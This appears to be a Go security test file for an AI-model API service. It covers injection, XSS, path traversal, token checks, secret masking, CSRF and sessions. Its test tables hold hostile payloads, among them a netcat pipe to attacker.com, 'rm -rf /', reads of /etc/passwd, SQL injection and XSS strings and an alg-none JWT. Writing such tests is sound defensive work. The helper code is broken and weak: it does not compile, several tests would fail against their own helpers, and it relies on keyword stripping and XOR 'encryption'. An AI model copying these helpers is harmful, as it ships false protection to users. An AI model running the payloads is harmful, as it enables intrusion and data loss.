package security

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// Test SQL injection prevention
func TestSQLInjectionPrevention(t *testing.T) {
	maliciousInputs := []string{
		"'; DROP TABLE models; --",
		"' OR '1'='1",
		"'; INSERT INTO users (name) VALUES ('hacker'); --",
		"' UNION SELECT * FROM sensitive_data --",
		"'; UPDATE models SET score = 10 WHERE id = 'gpt-4'; --",
	}

	for _, input := range maliciousInputs {
		t.Run(fmt.Sprintf("SQL_Injection_%s", input), func(t *testing.T) {
			// Test that malicious input is properly sanitized
			sanitized := sanitizeInput(input)
			assert.NotEqual(t, input, sanitized, "Input should be sanitized")
			assert.NotContains(t, sanitized, "DROP", "DROP statement should be removed")
			assert.NotContains(t, sanitized, "INSERT", "INSERT statement should be removed")
			assert.NotContains(t, sanitized, "UPDATE", "UPDATE statement should be removed")
			assert.NotContains(t, sanitized, "UNION", "UNION statement should be removed")
		})
	}
}

// Test XSS prevention
func TestXSSPrevention(t *testing.T) {
	xssPayloads := []string{
		`<script>alert('XSS')</script>`,
		`"><script>alert('XSS')</script>`,
		`<img src=x onerror=alert('XSS')>`,
		`javascript:alert('XSS')`,
		`<iframe src="javascript:alert('XSS')"></iframe>`,
	}

	for _, payload := range xssPayloads {
		t.Run(fmt.Sprintf("XSS_%s", payload), func(t *testing.T) {
			// Test that XSS payloads are properly escaped
			escaped := escapeHTML(payload)
			assert.NotEqual(t, payload, escaped, "Payload should be escaped")
			assert.NotContains(t, escaped, "<script>", "Script tags should be escaped")
			assert.NotContains(t, escaped, "javascript:", "JavaScript protocol should be removed")
		})
	}
}

// Test command injection prevention
func TestCommandInjectionPrevention(t *testing.T) {
	commandInjections := []string{
		"; rm -rf /",
		"&& cat /etc/passwd",
		"| nc attacker.com 1337",
		"`whoami`",
		"$(id)",
	}

	for _, injection := range commandInjections {
		t.Run(fmt.Sprintf("Command_Injection_%s", injection), func(t *testing.T) {
			// Test that command injection attempts are neutralized
			sanitized := sanitizeCommand(injection)
			assert.NotEqual(t, injection, sanitized, "Command should be sanitized")
			assert.NotContains(t, sanitized, ";", "Semicolon should be removed")
			assert.NotContains(t, sanitized, "&&", "AND operator should be removed")
			assert.NotContains(t, sanitized, "|", "Pipe should be removed")
			assert.NotContains(t, sanitized, "`", "Backticks should be removed")
			assert.NotContains(t, sanitized, "$", "Dollar sign should be removed")
		})
	}
}

// Test path traversal prevention
func TestPathTraversalPrevention(t *testing.T) {
	pathTraversals := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"/etc/passwd",
		"C:\\Windows\\System32\\config\\SAM",
		"file:///etc/passwd",
	}

	for _, traversal := range pathTraversals {
		t.Run(fmt.Sprintf("Path_Traversal_%s", traversal), func(t *testing.T) {
			// Test that path traversal attempts are blocked
			sanitized := sanitizePath(traversal)
			assert.NotEqual(t, traversal, sanitized, "Path should be sanitized")
			assert.NotContains(t, sanitized, "..", "Parent directory references should be removed")
			assert.NotContains(t, sanitized, "/etc/", "System paths should be blocked")
			assert.NotContains(t, sanitized, "windows", "Windows paths should be blocked")
		})
	}
}

// Test authentication bypass attempts
func TestAuthenticationBypass(t *testing.T) {
	bypassAttempts := []struct {
		name  string
		token string
	}{
		{"Empty_Token", ""},
		{"Null_Bytes", "token\x00"},
		{"JWT_Algorithm_None", "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."},
		{"Expired_Token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjEwfQ.invalid"},
		{"Malformed_Token", "not.a.jwt"},
		{"SQL_Injection_Token", "' OR '1'='1"},
	}

	for _, attempt := range bypassAttempts {
		t.Run(attempt.name, func(t *testing.T) {
			// Test that authentication bypass attempts are rejected
			isValid := validateAuthToken(attempt.token)
			assert.False(t, isValid, "Invalid token should be rejected")
		})
	}
}

// Test rate limiting
func TestRateLimiting(t *testing.T) {
	// Setup test server with rate limiting
	requestCount := 0
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requestCount++
		if requestCount > 10 {
			http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
			return
		}
		http.Error(w, "OK", http.StatusOK)
	}))
	defer server.Close()

	// Test rate limiting
	for i := 0; i < 15; i++ {
		resp, err := http.Get(fmt.Sprintf("%s/test", server.URL))
		require.NoError(t, err)
		
		if i < 10 {
			assert.Equal(t, http.StatusOK, resp.StatusCode)
		} else {
			assert.Equal(t, http.StatusTooManyRequests, resp.StatusCode)
		}
		resp.Body.Close()
	}
}

// Test API key exposure prevention
func TestAPIKeyExposure(t *testing.T) {
	apiKeys := []string{
		"sk-test-key-1234567890",
		"sk-ant-api03-key-1234567890",
		"sk-proj_test_key_1234567890",
	}

	for _, apiKey := range apiKeys {
		t.Run(fmt.Sprintf("API_Key_%s", apiKey), func(t *testing.T) {
			// Test that API keys are properly masked
			masked := maskAPIKey(apiKey)
			assert.NotEqual(t, apiKey, masked, "API key should be masked")
			assert.Contains(t, masked, "***", "API key should be partially masked")
			assert.Less(t, len(masked), len(apiKey), "Masked key should be shorter")
		})
	}
}

// Test secure configuration handling
func TestSecureConfiguration(t *testing.T) {
	config := map[string]interface{}{
		"apiKey": "sk-secret-key",
		"database": map[string]interface{}{
			"password": "db-secret-password",
			"host":     "localhost",
		},
		"providers": []map[string]interface{}{
			{
				"name":    "openai",
				"apiKey":  "sk-openai-key",
				"baseURL": "https://api.openai.com/v1",
			},
		},
	}

	// Test that configuration is properly sanitized
	sanitized := sanitizeConfiguration(config)
	
	// Check that secrets are masked
	assert.Contains(t, sanitized["apiKey"], "***", "API key should be masked")
	
	dbConfig := sanitized["database"].(map[string]interface{})
	assert.Contains(t, dbConfig["password"], "***", "Database password should be masked")
	
	providers := sanitized["providers"].([]map[string]interface{})
	assert.Contains(t, providers[0]["apiKey"], "***", "Provider API key should be masked")
}

// Test input validation
func TestInputValidation(t *testing.T) {
	invalidInputs := []struct {
		name  string
		input string
		type  string
	}{
		{"Empty_String", "", "model_id"},
		{"Too_Long", strings.Repeat("a", 1000), "model_id"},
		{"Special_Chars", "model<id>", "model_id"},
		{"SQL_Injection", "'; DROP TABLE --", "model_id"},
		{"Path_Traversal", "../../../etc/passwd", "file_path"},
		{"Command_Injection", "; rm -rf /", "command"},
	}

	for _, invalid := range invalidInputs {
		t.Run(invalid.name, func(t *testing.T) {
			// Test that invalid inputs are rejected
			isValid := validateInput(invalid.input, invalid.type)
			assert.False(t, isValid, "Invalid input should be rejected")
		})
	}

	// Test valid inputs
	validInputs := []struct {
		name  string
		input string
		type  string
	}{
		{"Valid_Model_ID", "gpt-4", "model_id"},
		{"Valid_Provider", "openai", "provider"},
		{"Valid_Email", "test@example.com", "email"},
		{"Valid_URL", "https://api.openai.com/v1", "url"},
	}

	for _, valid := range validInputs {
		t.Run(valid.name, func(t *testing.T) {
			isValid := validateInput(valid.input, valid.type)
			assert.True(t, isValid, "Valid input should be accepted")
		})
	}
}

// Test secure headers
func TestSecureHeaders(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Set security headers
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("X-XSS-Protection", "1; mode=block")
		w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
		w.Header().Set("Content-Security-Policy", "default-src 'self'")
		w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
		
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	}))
	defer server.Close()

	resp, err := http.Get(server.URL)
	require.NoError(t, err)
	defer resp.Body.Close()

	// Verify security headers are present
	assert.Equal(t, "nosniff", resp.Header.Get("X-Content-Type-Options"))
	assert.Equal(t, "DENY", resp.Header.Get("X-Frame-Options"))
	assert.Equal(t, "1; mode=block", resp.Header.Get("X-XSS-Protection"))
	assert.Contains(t, resp.Header.Get("Strict-Transport-Security"), "max-age=31536000")
	assert.Contains(t, resp.Header.Get("Content-Security-Policy"), "default-src")
	assert.Contains(t, resp.Header.Get("Referrer-Policy"), "strict-origin")
}

// Test encryption and decryption
func TestEncryptionDecryption(t *testing.T) {
	sensitiveData := []string{
		"sk-secret-api-key-1234567890",
		"db-password-secret-123",
		"jwt-secret-key-very-long-and-secure",
	}

	for _, data := range sensitiveData {
		t.Run(fmt.Sprintf("Encrypt_%s", data[:10]), func(t *testing.T) {
			// Test encryption
			encrypted, err := encrypt(data)
			require.NoError(t, err)
			assert.NotEqual(t, data, encrypted, "Data should be encrypted")
			assert.Greater(t, len(encrypted), len(data), "Encrypted data should be longer")

			// Test decryption
			decrypted, err := decrypt(encrypted)
			require.NoError(t, err)
			assert.Equal(t, data, decrypted, "Decrypted data should match original")
		})
	}
}

// Test logging security
func TestLoggingSecurity(t *testing.T) {
	sensitiveData := map[string]interface{}{
		"apiKey": "sk-secret-key",
		"token": "bearer-secret-token",
		"password": "user-password",
		"creditCard": "4111-1111-1111-1111",
		"ssn": "123-45-6789",
	}

	// Test that sensitive data is sanitized in logs
	sanitizedLog := sanitizeForLogging(sensitiveData)
	
	logStr := fmt.Sprintf("%v", sanitizedLog)
	assert.NotContains(t, logStr, "sk-secret-key", "API key should not be in logs")
	assert.NotContains(t, logStr, "bearer-secret-token", "Token should not be in logs")
	assert.NotContains(t, logStr, "user-password", "Password should not be in logs")
	assert.NotContains(t, logStr, "4111-1111-1111-1111", "Credit card should not be in logs")
	assert.NotContains(t, logStr, "123-45-6789", "SSN should not be in logs")
}

// Test CSRF protection
func TestCSRFProtection(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Check CSRF token
		csrfToken := r.Header.Get("X-CSRF-Token")
		if csrfToken == "" || csrfToken != "valid-token" {
			http.Error(w, "CSRF token missing or invalid", http.StatusForbidden)
			return
		}
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()

	// Test without CSRF token
	resp, err := http.Post(server.URL, "application/json", bytes.NewReader([]byte("{}")))
	require.NoError(t, err)
	assert.Equal(t, http.StatusForbidden, resp.StatusCode)
	resp.Body.Close()

	// Test with invalid CSRF token
	req, _ := http.NewRequest("POST", server.URL, bytes.NewReader([]byte("{}")))
	req.Header.Set("X-CSRF-Token", "invalid-token")
	client := &http.Client{}
	resp, err = client.Do(req)
	require.NoError(t, err)
	assert.Equal(t, http.StatusForbidden, resp.StatusCode)
	resp.Body.Close()

	// Test with valid CSRF token
	req.Header.Set("X-CSRF-Token", "valid-token")
	resp, err = client.Do(req)
	require.NoError(t, err)
	assert.Equal(t, http.StatusOK, resp.StatusCode)
	resp.Body.Close()
}

// Test session security
func TestSessionSecurity(t *testing.T) {
	// Test session token generation
	token := generateSecureToken()
	assert.NotEmpty(t, token, "Token should not be empty")
	assert.Greater(t, len(token), 32, "Token should be sufficiently long")
	
	// Test token uniqueness
	token2 := generateSecureToken()
	assert.NotEqual(t, token, token2, "Tokens should be unique")
	
	// Test session timeout
	session := createSession(token, 1*time.Hour)
	assert.False(t, isSessionExpired(session), "New session should not be expired")
	
	// Simulate time passing
	time.Sleep(2 * time.Second)
	session = createSession(token, 1*time.Second) // Short timeout for testing
	time.Sleep(2 * time.Second)
	assert.True(t, isSessionExpired(session), "Old session should be expired")
}

// Helper functions for security testing
func sanitizeInput(input string) string {
	// Remove SQL keywords and special characters
	input = strings.ReplaceAll(input, "'", "")
	input = strings.ReplaceAll(input, ";", "")
	input = strings.ReplaceAll(input, "--", "")
	input = strings.ReplaceAll(input, "/*", "")
	input = strings.ReplaceAll(input, "*/", "")
	input = strings.ReplaceAll(input, "DROP", "")
	input = strings.ReplaceAll(input, "INSERT", "")
	input = strings.ReplaceAll(input, "UPDATE", "")
	input = strings.ReplaceAll(input, "DELETE", "")
	input = strings.ReplaceAll(input, "UNION", "")
	input = strings.ReplaceAll(input, "SELECT", "")
	return input
}

func escapeHTML(input string) string {
	input = strings.ReplaceAll(input, "<", "&lt;")
	input = strings.ReplaceAll(input, ">", "&gt;")
	input = strings.ReplaceAll(input, "\"", "&quot;")
	input = strings.ReplaceAll(input, "'", "&#x27;")
	return input
}

func sanitizeCommand(input string) string {
	input = strings.ReplaceAll(input, ";", "")
	input = strings.ReplaceAll(input, "&", "")
	input = strings.ReplaceAll(input, "|", "")
	input = strings.ReplaceAll(input, "`", "")
	input = strings.ReplaceAll(input, "$", "")
	input = strings.ReplaceAll(input, "(", "")
	input = strings.ReplaceAll(input, ")", "")
	return input
}

func sanitizePath(input string) string {
	input = strings.ReplaceAll(input, "..", "")
	input = strings.ReplaceAll(input, "/", "")
	input = strings.ReplaceAll(input, "\\", "")
	return input
}

func validateAuthToken(token string) bool {
	// Simple validation - in real implementation, use proper JWT validation
	if token == "" {
		return false
	}
	if strings.Contains(token, "NULL") {
		return false
	}
	if strings.Contains(token, "OR") && strings.Contains(token, "=") {
		return false
	}
	return true
}

func maskAPIKey(apiKey string) string {
	if len(apiKey) <= 8 {
		return "***"
	}
	return apiKey[:4] + "***" + apiKey[len(apiKey)-4:]
}

func sanitizeConfiguration(config map[string]interface{}) map[string]interface{} {
	sanitized := make(map[string]interface{})
	for key, value := range config {
		switch v := value.(type) {
		case string:
			if strings.Contains(strings.ToLower(key), "key") || 
			   strings.Contains(strings.ToLower(key), "password") ||
			   strings.Contains(strings.ToLower(key), "secret") ||
			   strings.Contains(strings.ToLower(key), "token") {
				sanitized[key] = maskAPIKey(v)
			} else {
				sanitized[key] = v
			}
		case map[string]interface{}:
			sanitized[key] = sanitizeConfiguration(v)
		case []interface{}:
			sanitized[key] = sanitizeArray(v)
		default:
			sanitized[key] = v
		}
	}
	return sanitized
}

func sanitizeArray(array []interface{}) []interface{} {
	sanitized := make([]interface{}, len(array))
	for i, item := range array {
		if m, ok := item.(map[string]interface{}); ok {
			sanitized[i] = sanitizeConfiguration(m)
		} else {
			sanitized[i] = item
		}
	}
	return sanitized
}

func validateInput(input, inputType string) bool {
	if input == "" {
		return false
	}
	
	switch inputType {
	case "model_id":
		return len(input) > 0 && len(input) < 100 && !strings.ContainsAny(input, "<>'\"$;")
	case "provider":
		return len(input) > 0 && len(input) < 50 && !strings.ContainsAny(input, "<>'\"$;")
	case "email":
		return strings.Contains(input, "@") && strings.Contains(input, ".")
	case "url":
		return strings.HasPrefix(input, "http://") || strings.HasPrefix(input, "https://")
	default:
		return len(input) > 0 && len(input) < 1000
	}
}

func encrypt(data string) (string, error) {
	// Simple XOR encryption for testing - use proper encryption in production
	key := "test-encryption-key-32-bytes-long"
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return string(result), nil
}

func decrypt(encrypted string) (string, error) {
	// XOR is symmetric
	return encrypt(encrypted)
}

func sanitizeForLogging(data map[string]interface{}) map[string]interface{} {
	sanitized := make(map[string]interface{})
	for key, value := range data {
		switch strings.ToLower(key) {
		case "apikey", "token", "password", "creditcard", "ssn":
			sanitized[key] = "[REDACTED]"
		default:
			sanitized[key] = value
		}
	}
	return sanitized
}

func generateSecureToken() string {
	// Simple token generation for testing
	return fmt.Sprintf("token-%d-%d", time.Now().Unix(), time.Now().Nanosecond())
}

func createSession(token string, duration time.Duration) map[string]interface{} {
	return map[string]interface{}{
		"token":     token,
		"created":   time.Now(),
		"expires":   time.Now().Add(duration),
	}
}

func isSessionExpired(session map[string]interface{}) bool {
	expires, ok := session["expires"].(time.Time)
	if !ok {
		return true
	}
	return time.Now().After(expires)
}